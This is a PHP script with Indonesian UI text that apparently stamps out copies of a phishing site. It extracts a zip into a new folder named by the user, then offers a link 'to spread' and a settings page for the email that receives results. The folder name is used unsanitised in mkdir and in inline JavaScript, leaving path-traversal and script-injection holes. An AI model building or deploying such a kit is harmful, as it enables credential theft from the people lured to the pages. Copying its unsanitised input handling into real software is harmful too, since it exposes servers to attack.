<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $subdo = $_POST["subdo"];

    if (isset($_POST["prosesbuat"])) {
        $newfol = "$subdo";
        $folderPath = "x/$newfol";

        mkdir($folderPath);

        $zipFilePath = "scsalzz/gg.zip";
        $newZipFilePath = "$folderPath/gg.zip";
        copy($zipFilePath, $newZipFilePath);

        $zip = new ZipArchive;
        if ($zip->open($newZipFilePath) === TRUE) {
            $zip->extractTo($folderPath);
            $zip->close();
        }

        unlink($newZipFilePath);

        // Arahkan ke done.php setelah proses selesai
        header("");
        exit('<style>body {
    display: grid;
        place-items: center;
        text-align: center;
        background: linear-gradient(-45deg, #ee7752, #e73c7e, #23a6d5, #23d5ab);
        background-size: 400% 400%;
        animation: gradient 20s ease infinite;
        }
        @keyframes gradient {
            0% {
                background-position: 0% 50%;
            }
            50% {
                background-position: 100% 50%;
            }
            100% {
                background-position: 0% 50%;
            }
        }

.panel {
    background-color: #fff;
    padding: 20px;
    border-radius: 8px;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    max-width: 400px;
    width: 100%;
    text-align: center;
}

label {
    display: block;
    margin-bottom: 10px;
}

input {
    width: calc(100% - 20px);
    padding: 8px;
    margin-bottom: 15px;
    box-sizing: border-box;
    border: 1px solid #ccc;
    border-radius: 4px;
}

.button-group {
    display: flex;
    justify-content: space-between;
}

button {
    flex: 1;
    background-color: #4CAF50;
    color: #fff;
    padding: 10px;
    border: none;
    border-radius: 4px;
    cursor: pointer;
    font-size: 16px;
    margin-right: 5px;
}

button:hover {
    background-color: #45a049;
}

/* Style umum untuk halaman */
body {
    font-family: "Roboto", sans-serif;
    background-image: url("https://i.giphy.com/eJoZAwRN9OI5QjthIE.webp");
    color: #ecf0f1; /* Warna teks */
    margin: 0;
    display: flex;
    align-items: center;
    justify-content: center;
    height: 100vh;
}

/* Style untuk panel input */
.panel {
    background: rgba( 255, 255, 255, 0.2 ); /* Warna panel */
    padding: 20px;
    border-radius: 8px;
    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    max-width: 400px;
    width: 100%;
    text-align: center;
}

.panel label {
    display: block;
    margin-bottom: 10px;
}

.panel input {
    width: calc(100% - 20px);
    padding: 8px;
    margin-bottom: 15px;
    box-sizing: border-box;
    border: 1px solid #2c3e50; /* Warna border */
    border-radius: 4px;
    background-color: #ecf0f1; /* Warna input */
    color: #34495e; /* Warna teks input */
}

.panel .button-group {
    display: flex;
    justify-content: space-between;
}

.panel button {
    flex: 1;
    background-color: #0000FF; /* Warna tombol */
    color: #fff;
    padding: 10px;
    border: none;
    border-radius: 4px;
    cursor: pointer;
    font-size: 16px;
    margin-right: 5px;
}

.panel button:hover {
    background-color: #2980b9; /* Warna tombol saat dihover */
}

/* Style untuk tombol setelah proses pembuatan web baru */
.success-buttons {
    margin-top: 15px;
}

.success-buttons button {
    background-color: #3498db; /* Warna tombol */
    color: #fff;
    padding: 10px;
    border: none;
    border-radius: 4px;
    cursor: pointer;
    font-size: 16px;
    margin-right: 5px;
}

.success-buttons button:hover {
    background-color: #2980b9; /* Warna tombol saat dihover */
}
</style><body>
<div class="panel">
<center><svg height="150px" width="150px" version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" 
	 viewBox="0 0 55.702 55.702" xml:space="preserve">
<g>
	<g>
		<path style="fill:#010002;" d="M27.851,0C12.494,0,0,12.494,0,27.851s12.494,27.851,27.851,27.851s27.851-12.494,27.851-27.851
			C55.701,12.494,43.208,0,27.851,0z M27.851,51.213c-12.882,0-23.362-10.48-23.362-23.363c0-12.882,10.48-23.362,23.362-23.362
			s23.362,10.481,23.362,23.363S40.733,51.213,27.851,51.213z"/>
		<path style="fill:#7FFF00;" d="M36.729,18.97l-13,13.001l-4.757-4.757c-0.876-0.877-2.297-0.877-3.173,0
			c-0.877,0.876-0.877,2.297,0,3.173l6.344,6.344c0.438,0.438,1.013,0.658,1.587,0.658s1.148-0.219,1.586-0.658l14.587-14.587
			c0.876-0.877,0.876-2.297,0-3.174C39.026,18.094,37.606,18.094,36.729,18.97z"/>
	</g>
</g>
</svg></center>
<h2>WEB ANDA BERHASIL DI BUAT!</h2>
    <div class="button-group">
        <button style="font-weight:bold;" onclick="salinLink()">Salin URL</button>
        </div>
        <br>
        <div class="button-group">
        <button style="font-weight:bold;" onclick="bukaSetting()">Setting</button>
        </div>
        <br>
        <div class="button-group">
        <button style="font-weight:bold;" onclick="SalinTeks()">Salin Detail Web ( Agar tidak hilang )</button>
    </div>
</div>

<script>
    function salinLink() {
        var dummy = document.createElement("textarea");
        document.body.appendChild(dummy);
        dummy.value =  window.location.origin + "/'.$folderPath.'";
        dummy.select();
        document.execCommand("copy");
        document.body.removeChild(dummy);
        alert("Link berhasil disalin!");
    }

    function bukaSetting() {
        window.location.href = "'.$folderPath.'/AlexHostX.php";
    }
    
    function SalinTeks() {
        var dummy = document.createElement("textarea");
        document.body.appendChild(dummy);
        dummy.value = "Website untuk nebar : https://<?= $longURL ?>\n\nWeb Setting Untuk Email : https://<?= $longURL ?>/AlexHostX.php";
        dummy.select();
        document.execCommand("copy");
        document.body.removeChild(dummy);
        alert("Berhasil Menyalin Detail Website Anda!\nTempel Teks Nya Untuk Melihat Link");
    }
</script>

</body>
');
    }
}
?>
